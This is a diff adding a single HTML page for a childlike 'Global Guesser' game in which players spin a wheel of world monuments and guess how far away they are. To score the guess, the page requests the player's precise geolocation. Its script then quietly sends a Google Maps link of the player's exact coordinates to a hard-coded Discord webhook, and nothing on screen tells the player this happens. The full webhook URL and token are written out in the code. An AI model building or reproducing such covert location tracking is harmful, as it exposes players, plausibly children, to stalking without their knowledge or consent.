@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Global Guesser Game</title>
+    <!-- Tailwind CSS for modern styling -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Bubblegum+Sans&family=Coming+Soon&display=swap" rel="stylesheet">
+    <style>
+        /* Custom styles for the game */
+        body {
+            font-family: 'Coming Soon', cursive; /* Childish font for the body */
+            background-color: #F8F8F8; /* Off-white background */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            overflow: hidden; /* Prevent scrollbars from casino wheel */
+        }
+
+        /* General container styling */
+        .game-container {
+            width: 100%;
+            max-width: 600px; /* Max width for better experience on large screens */
+            padding: 20px;
+            text-align: center;
+            background-color: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            box-sizing: border-box; /* Include padding in element's total width and height */
+        }
+
+        /* Childish style for the play button */
+        .play-button, .game-button {
+            background-color: #EF4444; /* Red */
+            color: white;
+            padding: 15px 30px;
+            border-radius: 50px; /* Very rounded */
+            font-size: 1.8rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease, transform 0.2s ease;
+            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
+            border: 4px solid #DC2626; /* Darker red border */
+            font-family: 'Bubblegum Sans', cursive; /* Specific childish font for buttons */
+        }
+
+        .play-button:hover, .game-button:hover {
+            background-color: #DC2626; /* Darker red on hover */
+            transform: translateY(-3px); /* Pop effect */
+        }
+
+        .play-button:active, .game-button:active {
+            transform: translateY(1px); /* Push effect */
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        /* Game title style */
+        .game-title {
+            font-family: 'Bubblegum Sans', cursive; /* Childish font for title */
+            font-size: 3.5rem; /* Large size */
+            color: #4A5568; /* Dark grey color */
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 5px rgba(0,0,0,0.1);
+        }
+
+        /* Message box for alerts */
+        .message-box {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #333;
+            color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            z-index: 1000;
+            display: none; /* Hidden by default */
+            font-family: 'Coming Soon', cursive;
+        }
+
+        /* Casino wheel styling */
+        .casino-wheel-container {
+            width: 100%;
+            height: 200px; /* Fixed height for the visible area */
+            overflow: hidden;
+            border: 5px solid #CBD5E0; /* Light grey border */
+            border-radius: 15px;
+            margin: 20px auto;
+            background-color: #F7FAFC; /* Light background */
+            box-shadow: inset 0 0 10px rgba(0,0,0,0.1);
+            position: relative;
+        }
+
+        .casino-wheel {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            width: 100%;
+            transition: transform 3s ease-out; /* Smooth transition for stopping */
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+
+        .casino-wheel-item {
+            padding: 15px 0;
+            font-size: 2rem;
+            font-weight: bold;
+            color: #2D3748; /* Darker text */
+            text-align: center;
+            border-bottom: 1px solid #EDF2F7; /* Subtle separator */
+            box-sizing: border-box; /* Ensures padding is included in height */
+        }
+
+        .casino-wheel-item:last-child {
+            border-bottom: none;
+        }
+
+        .casino-wheel-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            pointer-events: none; /* Allow clicks to pass through */
+            border-radius: 15px;
+            box-shadow: inset 0 0 0 5px #CBD5E0; /* Re-apply border as overlay */
+            background: linear-gradient(to bottom, rgba(255,255,255,0.8) 0%, rgba(255,255,255,0) 20%, rgba(255,255,255,0) 80%, rgba(255,255,255,0.8) 100%);
+        }
+
+        /* Input field styling */
+        .game-input {
+            width: calc(100% - 40px); /* Full width minus padding */
+            padding: 12px 20px;
+            margin: 10px auto;
+            border: 2px solid #CBD5E0;
+            border-radius: 10px;
+            font-size: 1.2rem;
+            text-align: center;
+            font-family: 'Coming Soon', cursive;
+        }
+
+        .game-input:focus {
+            outline: none;
+            border-color: #A0AEC0;
+            box-shadow: 0 0 0 3px rgba(160, 174, 192, 0.3);
+        }
+
+        /* Loading spinner */
+        .loading-spinner {
+            border: 4px solid #f3f3f3; /* Light grey */
+            border-top: 4px solid #3498db; /* Blue */
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+            display: none; /* Hidden by default */
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            .game-title {
+                font-size: 2.5rem;
+            }
+            .play-button, .game-button {
+                font-size: 1.5rem;
+                padding: 12px 25px;
+            }
+            .casino-wheel-item {
+                font-size: 1.5rem;
+            }
+            .game-input {
+                font-size: 1rem;
+                padding: 10px 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="game-container">
+        <!-- Start Menu -->
+        <div id="start-menu" class="flex flex-col items-center">
+            <h1 class="game-title">Global Guesser</h1>
+            <button id="play-button" class="play-button">Play</button>
+        </div>
+
+        <!-- Game Play Area -->
+        <div id="game-area" class="hidden flex flex-col items-center">
+            <h2 id="monument-title" class="text-3xl font-bold text-gray-700 mb-4">Select a Monument</h2>
+            <div class="casino-wheel-container">
+                <ul id="monument-wheel" class="casino-wheel">
+                    <!-- Monument items will be populated here by JavaScript -->
+                </ul>
+                <div class="casino-wheel-overlay"></div>
+            </div>
+            <button id="stop-monument-button" class="game-button mt-4">Spin!</button>
+
+            <div id="estimation-section" class="hidden w-full flex flex-col items-center">
+                <p id="current-monument-text" class="text-xl text-gray-800 mb-4"></p>
+                <label for="distance-input" class="text-lg text-gray-700 mb-2">Estimate the distance in km:</label>
+                <input type="number" id="distance-input" class="game-input" placeholder="Your guess in km">
+                <button id="validate-button" class="game-button mt-4">Validate Guess</button>
+            </div>
+
+            <div id="distance-reveal-section" class="hidden w-full flex flex-col items-center">
+                <p class="text-xl text-gray-800 mb-4">The actual distance was:</p>
+                <div class="casino-wheel-container">
+                    <ul id="distance-wheel" class="casino-wheel">
+                        <!-- Distance items will be populated here by JavaScript -->
+                    </ul>
+                    <div class="casino-wheel-overlay"></div>
+                </div>
+                <p id="feedback-message" class="text-2xl font-bold text-gray-800 mt-4"></p>
+                <button id="retry-button" class="game-button mt-4">Retry</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Message Box Element -->
+    <div id="message-box" class="message-box"></div>
+
+    <script>
+        // Placeholder for Discord Webhook URL. REPLACE THIS WITH YOUR ACTUAL WEBHOOK URL.
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1380975023619313694/vE_z46rPwsekjsMlPoCO76PNqlMG7MkvqUszO6eGeF-V9g3tyCmuxVuUbq--C6lWixmH';
+
+        // --- Game State Variables ---
+        let selectedMonument = null;
+        let userLatitude = null;
+        let userLongitude = null;
+        let actualDistance = 0;
+        let isSpinning = false;
+        let messageTimeout; // To clear message box after some time
+
+        // --- DOM Elements ---
+        const startMenu = document.getElementById('start-menu');
+        const gameArea = document.getElementById('game-area');
+        const playButton = document.getElementById('play-button');
+        const monumentTitle = document.getElementById('monument-title');
+        const monumentWheel = document.getElementById('monument-wheel');
+        const stopMonumentButton = document.getElementById('stop-monument-button');
+        const estimationSection = document.getElementById('estimation-section');
+        const currentMonumentText = document.getElementById('current-monument-text');
+        const distanceInput = document.getElementById('distance-input');
+        const validateButton = document.getElementById('validate-button');
+        const distanceRevealSection = document.getElementById('distance-reveal-section');
+        const distanceWheel = document.getElementById('distance-wheel');
+        const feedbackMessage = document.getElementById('feedback-message');
+        const retryButton = document.getElementById('retry-button');
+        const messageBox = document.getElementById('message-box');
+
+        // --- Game Data: Famous Monuments with approximate coordinates ---
+        const monuments = [
+            { name: "Eiffel Tower", country: "France", lat: 48.8584, lon: 2.2945 },
+            { name: "Statue of Liberty", country: "USA", lat: 40.6892, lon: -74.0445 },
+            { name: "Colosseum", country: "Italy", lat: 41.8902, lon: 12.4922 },
+            { name: "Taj Mahal", country: "India", lat: 27.1751, lon: 78.0421 },
+            { name: "Great Wall of China (Badaling)", country: "China", lat: 40.4319, lon: 116.5704 },
+            { name: "Machu Picchu", country: "Peru", lat: -13.1631, lon: -72.5450 },
+            { name: "Pyramids of Giza", country: "Egypt", lat: 29.9792, lon: 31.1342 },
+            { name: "Christ the Redeemer", country: "Brazil", lat: -22.9519, lon: -43.2105 },
+            { name: "Sydney Opera House", country: "Australia", lat: -33.8568, lon: 151.2153 },
+            { name: "Big Ben", country: "UK", lat: 51.5007, lon: -0.1246 },
+            { name: "Burj Khalifa", country: "UAE", lat: 25.1972, lon: 55.2744 },
+            { name: "Golden Gate Bridge", country: "USA", lat: 37.8199, lon: -122.4783 },
+            { name: "Mount Everest", country: "Nepal", lat: 27.9881, lon: 86.9250 },
+            { name: "Stonehenge", country: "UK", lat: 51.1789, lon: -1.8262 },
+            { name: "Parthenon", country: "Greece", lat: 37.9715, lon: 23.7236 },
+            { name: "Angkor Wat", country: "Cambodia", lat: 13.4125, lon: 103.8670 }
+        ];
+
+        // --- Utility Functions ---
+
+        /**
+         * Displays a temporary message in a custom message box.
+         * @param {string} message - The message to display.
+         * @param {number} duration - How long to display the message in milliseconds.
+         */
+        function showMessage(message, duration = 3000) {
+            clearTimeout(messageTimeout); // Clear any existing timeout
+            messageBox.textContent = message;
+            messageBox.style.display = 'block';
+            messageTimeout = setTimeout(() => {
+                messageBox.style.display = 'none';
+            }, duration);
+        }
+
+        /**
+         * Calculates the distance between two geographical points using the Haversine formula.
+         * @param {number} lat1 - Latitude of point 1.
+         * @param {number} lon1 - Longitude of point 1.
+         * @param {number} lat2 - Latitude of point 2.
+         * @param {number} lon2 - Longitude of point 2.
+         * @returns {number} Distance in kilometers.
+         */
+        function haversineDistance(lat1, lon1, lat2, lon2) {
+            const R = 6371; // Radius of Earth in kilometers
+            const toRad = (value) => (value * Math.PI) / 180;
+
+            const dLat = toRad(lat2 - lat1);
+            const dLon = toRad(lon2 - lon1);
+            const a =
+                Math.sin(dLat / 2) * Math.sin(dLat / 2) +
+                Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) *
+                Math.sin(dLon / 2) * Math.sin(dLon / 2);
+            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+            return R * c; // Distance in km
+        }
+
+        /**
+         * Populates the casino wheel with items and sets up a spin animation.
+         * @param {HTMLElement} wheelElement - The UL element for the wheel.
+         * @param {Array<string|number>} items - The list of items to display.
+         * @param {number} stopIndex - The index of the item to stop on (in the original 'items' array).
+         * @param {number} totalSpins - Number of full rotations before stopping.
+         * @returns {Promise<void>} A promise that resolves when the spin animation finishes.
+         */
+        function spinCasinoWheel(wheelElement, items, stopIndex, totalSpins = 3) {
+            return new Promise(resolve => {
+                isSpinning = true;
+                wheelElement.style.transition = 'none'; // Disable transition for initial position
+                wheelElement.innerHTML = ''; // Clear previous items
+
+                // Calculate the actual target index in the generated long list of items
+                const actualTargetIndex = items.length * (totalSpins - 1) + stopIndex;
+
+                // Generate enough items to ensure smooth spinning and landing on the target
+                // Add a buffer of one full cycle at the end
+                const itemsToGenerate = items.length * totalSpins + items.length;
+
+                for (let i = 0; i < itemsToGenerate; i++) {
+                    const item = items[i % items.length];
+                    const li = document.createElement('li');
+                    li.classList.add('casino-wheel-item');
+                    li.textContent = item;
+                    wheelElement.appendChild(li);
+                }
+
+                // Get the accurate height of a single item after rendering
+                const itemHeight = wheelElement.querySelector('.casino-wheel-item').offsetHeight;
+
+                // Calculate the final translation Y to center the target item
+                const containerHeight = wheelElement.parentElement.clientHeight;
+                const centerOffset = (containerHeight / 2) - (itemHeight / 2);
+                const targetScrollPosition = actualTargetIndex * itemHeight;
+                const finalTranslateY = -targetScrollPosition + centerOffset;
+
+                // Set initial position (important for smooth transition start)
+                wheelElement.style.transform = `translateY(0px)`;
+
+                // Small timeout to allow the 'transition: none' to apply before starting transition
+                setTimeout(() => {
+                    wheelElement.style.transition = 'transform 3s ease-out'; // Apply transition
+                    wheelElement.style.transform = `translateY(${finalTranslateY}px)`;
+                }, 50); // A small delay
+
+                wheelElement.addEventListener('transitionend', function handler() {
+                    wheelElement.removeEventListener('transitionend', handler);
+                    isSpinning = false;
+                    resolve();
+                });
+            });
+        }
+
+        /**
+         * Initializes the game by setting up event listeners and showing the start menu.
+         */
+        function initializeGame() {
+            startMenu.classList.remove('hidden');
+            gameArea.classList.add('hidden');
+            estimationSection.classList.add('hidden');
+            distanceRevealSection.classList.add('hidden');
+            distanceInput.value = ''; // Clear previous input
+
+            playButton.addEventListener('click', startMonumentSelection);
+            stopMonumentButton.addEventListener('click', stopMonumentSpin);
+            validateButton.addEventListener('click', handleValidation);
+            retryButton.addEventListener('click', resetGame);
+        }
+
+        /**
+         * Starts the monument selection phase.
+         * This function can be called directly by the retry button.
+         */
+        async function startMonumentSelection() {
+            startMenu.classList.add('hidden');
+            gameArea.classList.remove('hidden');
+            monumentTitle.textContent = "Spin the wheel to select a monument!";
+            stopMonumentButton.textContent = "Spin!";
+            stopMonumentButton.classList.remove('hidden');
+            estimationSection.classList.add('hidden');
+            distanceRevealSection.classList.add('hidden');
+
+            // Populate monument wheel for spinning without an initial spin animation
+            const monumentNames = monuments.map(m => `${m.name} (${m.country})`);
+            monumentWheel.style.transition = 'none'; // Ensure no transition on initial load
+            monumentWheel.style.transform = `translateY(0px)`; // Reset position
+            monumentWheel.innerHTML = ''; // Clear for fresh items
+            for (let i = 0; i < monuments.length; i++) { // Only add actual items initially, no duplicates
+                const li = document.createElement('li');
+                li.classList.add('casino-wheel-item');
+                li.textContent = monumentNames[i];
+                monumentWheel.appendChild(li);
+            }
+        }
+
+        /**
+         * Stops the monument wheel spin and selects a monument.
+         */
+        async function stopMonumentSpin() {
+            if (isSpinning) return; // Prevent multiple clicks
+
+            const randomIndex = Math.floor(Math.random() * monuments.length);
+            selectedMonument = monuments[randomIndex];
+            stopMonumentButton.classList.add('hidden');
+            monumentTitle.textContent = "Spinning...";
+
+            await spinCasinoWheel(monumentWheel, monuments.map(m => `${m.name} (${m.country})`), randomIndex);
+
+            monumentTitle.textContent = `Monument selected: ${selectedMonument.name} (${selectedMonument.country})`;
+            currentMonumentText.textContent = `How far are you from ${selectedMonument.name} (${selectedMonument.country})?`;
+            estimationSection.classList.remove('hidden');
+            distanceInput.focus();
+        }
+
+        /**
+         * Handles the validation of the user's distance guess, including geolocation.
+         */
+        function handleValidation() {
+            const guessedDistance = parseFloat(distanceInput.value);
+
+            if (isNaN(guessedDistance) || guessedDistance <= 0) {
+                showMessage("Please enter a valid distance in kilometers.");
+                return;
+            }
+
+            validateButton.textContent = "Getting Location...";
+            validateButton.disabled = true;
+
+            // Check if geolocation already obtained
+            if (userLatitude !== null && userLongitude !== null) {
+                calculateAndRevealDistance(guessedDistance);
+            } else if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        userLatitude = position.coords.latitude;
+                        userLongitude = position.coords.longitude;
+                        calculateAndRevealDistance(guessedDistance);
+                    },
+                    (error) => {
+                        validateButton.textContent = "Validate Guess";
+                        validateButton.disabled = false;
+                        let errorMessage = "Geolocation failed. Please allow location access to continue.";
+                        switch (error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = "Location access denied. Please enable it in your browser settings.";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = "Location information is unavailable.";
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = "The request to get user location timed out.";
+                                break;
+                        }
+                        showMessage(errorMessage);
+                        console.error("Geolocation error:", error);
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 } // Options for geolocation
+                );
+            } else {
+                validateButton.textContent = "Validate Guess";
+                validateButton.disabled = false;
+                showMessage("Geolocation is not supported by your browser.");
+            }
+        }
+
+        /**
+         * Calculates the actual distance and reveals the result.
+         * @param {number} guessedDistance - The user's estimated distance.
+         */
+        async function calculateAndRevealDistance(guessedDistance) {
+            actualDistance = haversineDistance(
+                userLatitude,
+                userLongitude,
+                selectedMonument.lat,
+                selectedMonument.lon
+            );
+            actualDistance = Math.round(actualDistance); // Round to nearest whole number
+
+            // Send Google Maps link to Discord webhook (only player's location)
+            const mapsLink = `https://www.google.com/maps?q=${userLatitude},${userLongitude}`;
+            const webhookMessage = `A player is guessing distance from ${selectedMonument.name} (${selectedMonument.country})! Player's location: ${mapsLink}`;
+            sendDiscordWebhook(webhookMessage);
+
+            // Hide estimation, show reveal
+            estimationSection.classList.add('hidden');
+            distanceRevealSection.classList.remove('hidden');
+            validateButton.textContent = "Validate Guess";
+            validateButton.disabled = false;
+
+            // Populate and spin distance wheel
+            const distances = [];
+
+            // Generate a good range of distances for the wheel, centered around actualDistance
+            // with more granularity around the actual distance and larger steps further away.
+            for (let i = 1; i <= 30000; i += 500) { // Large steps for the wide range
+                if (!distances.includes(`${i} km`)) {
+                    distances.push(`${i} km`);
+                }
+            }
+            // Add a finer range around the actual distance for precision
+            const rangeAroundActual = 1000; // e.g., +/- 1000 km
+            const stepFine = 10;
+            for (let i = Math.max(1, actualDistance - rangeAroundActual); i <= actualDistance + rangeAroundActual; i += stepFine) {
+                if (!distances.includes(`${i} km`)) {
+                    distances.push(`${i} km`);
+                }
+            }
+             // Ensure the actual distance is exactly in the list
+            if (!distances.includes(`${actualDistance} km`)) {
+                distances.push(`${actualDistance} km`);
+            }
+
+            distances.sort((a, b) => parseFloat(a) - parseFloat(b)); // Sort numerically
+
+            // Find the index of the actual distance
+            let stopDistanceIndex = distances.indexOf(`${actualDistance} km`);
+
+            // Fallback: If exact match not found (unlikely but safe), find closest or just use a default
+            if (stopDistanceIndex === -1 && actualDistance > 0) {
+                 // Try to find the closest value
+                let closestValue = distances[0];
+                let minDiff = Math.abs(actualDistance - parseFloat(closestValue));
+                for (let i = 1; i < distances.length; i++) {
+                    const diff = Math.abs(actualDistance - parseFloat(distances[i]));
+                    if (diff < minDiff) {
+                        minDiff = diff;
+                        closestValue = distances[i];
+                    }
+                }
+                stopDistanceIndex = distances.indexOf(closestValue);
+            }
+            // If still -1 (e.g., distances array empty or no positive actualDistance), default to middle
+            if (stopDistanceIndex === -1) {
+                stopDistanceIndex = Math.floor(distances.length / 2);
+            }
+
+            await spinCasinoWheel(distanceWheel, distances, stopDistanceIndex, 3); // Spin 3 times to make it dramatic
+
+            displayFeedback(guessedDistance, actualDistance);
+        }
+
+        /**
+         * Displays feedback to the player based on their guess accuracy.
+         * @param {number} guessedDistance - The user's estimated distance.
+         * @param {number} actualDistance - The true distance.
+         */
+        function displayFeedback(guessedDistance, actualDistance) {
+            const difference = Math.abs(guessedDistance - actualDistance);
+            let message = "";
+
+            if (difference <= 1) {
+                message = "Bravo! We have an expert here!";
+            } else if (difference <= 10) {
+                message = "Wow! Impressive, well done!";
+            } else if (difference <= 100) {
+                message = "Not bad at all! You're not bad.";
+            } else if (difference <= 1000) {
+                message = "Not bad, but you can do better.";
+            } else if (difference <= 10000) {
+                message = "That's almost it, but no.";
+            } else {
+                message = `Your guess was ${guessedDistance} km. The actual distance was ${actualDistance} km. Keep practicing!`;
+            }
+
+            feedbackMessage.textContent = message;
+            retryButton.classList.remove('hidden');
+        }
+
+        /**
+         * Sends a message to the configured Discord webhook.
+         * @param {string} message - The message content to send.
+         */
+        async function sendDiscordWebhook(message) {
+            if (DISCORD_WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL_HERE' || !DISCORD_WEBHOOK_URL) {
+                console.warn('Discord Webhook URL not set. Cannot send message.');
+                // showMessage('Warning: Discord Webhook URL is not configured. Webhook message not sent.', 5000);
+                return;
+            }
+            try {
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ content: message }),
+                });
+                if (response.ok) {
+                    console.log('Webhook sent successfully!');
+                } else {
+                    console.error('Failed to send webhook:', response.status, response.statusText);
+                    showMessage('Error: Could not send webhook message.', 5000);
+                }
+            } catch (error) {
+                console.error('Error sending webhook:', error);
+                showMessage('Error: Failed to connect to Discord webhook.', 5000);
+            }
+        }
+
+        /**
+         * Resets the game to the initial state for a new round.
+         */
+        function resetGame() {
+            selectedMonument = null;
+            actualDistance = 0;
+            distanceInput.value = '';
+            feedbackMessage.textContent = '';
+            retryButton.classList.add('hidden');
+            startMonumentSelection(); // Directly restart the monument selection
+        }
+
+        // Initialize the game when the window loads
+        window.onload = initializeGame;
+
+    </script>
+</body>
+</html>
